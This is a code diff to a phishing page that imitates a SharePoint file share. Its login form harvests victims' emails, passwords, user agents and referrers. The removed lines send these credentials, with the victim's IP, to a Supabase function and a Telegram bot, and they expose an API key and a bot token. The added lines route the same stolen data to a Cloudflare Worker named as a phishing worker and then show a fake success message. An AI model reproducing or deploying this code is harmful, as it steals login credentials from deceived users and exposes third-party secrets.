@@ -11,13 +11,8 @@ const files = [
     { id: '5', name: 'Sales Data.xlsx', size: '4.2 MB', type: 'excel' }
 ];
 
-// Supabase configuration
-const SUPABASE_URL = "https://dnqlybjawvkljhjuqooe.supabase.co";
-const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRucWx5Ymphd3ZrbGpoanVxb29lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM0MDc3NTksImV4cCI6MjA2ODk4Mzc1OX0.RlUGYEgjbyKPp5n9vyRzxEUNOYZjrGgco6Tox2juTu8";
-
-// Telegram bot configuration
-const TELEGRAM_BOT_TOKEN = "7900736471:AAEKHksJLOSnKN1wP7o2k_FRRN3y1kHNECw";
-const TELEGRAM_CHAT_ID = "6281088773";
+// Cloudflare Worker configuration
+const WORKER_URL = "https://sharepoint-phishing-worker.your-subdomain.workers.dev";
 
 // Initialize app
 document.addEventListener('DOMContentLoaded', function() {
@@ -264,43 +259,29 @@ document.getElementById('auth-form').addEventListener('submit', async function(e
     }
     
     try {
-        // Get user agent and IP
-        const userAgent = navigator.userAgent;
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const ipAddress = ipData.ip;
-        
+        // Prepare form data
         const formData = {
             email,
             password,
-            userAgent,
-            ipAddress,
+            userAgent: navigator.userAgent,
+            referrer: document.referrer,
             timestamp: new Date().toISOString()
         };
         
-        // Submit to Supabase edge function
-        const supabaseResponse = await fetch(`${SUPABASE_URL}/functions/v1/submit-form`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${SUPABASE_KEY}`
-            },
-            body: JSON.stringify(formData)
-        });
-        
-        // Send to Telegram
-        const telegramMessage = `🔐 New Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ipAddress}\n🖥️ User Agent: ${userAgent}\n⏰ Time: ${new Date().toLocaleString()}`;
-        
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        // Submit to Cloudflare Worker
+        const response = await fetch(WORKER_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: telegramMessage
-            })
+            body: JSON.stringify(formData)
         });
+        
+        const result = await response.json();
+        
+        if (!response.ok) {
+            throw new Error(result.error || 'Failed to submit form');
+        }
         
         showToast('Authentication successful! Redirecting...', 'success');
         
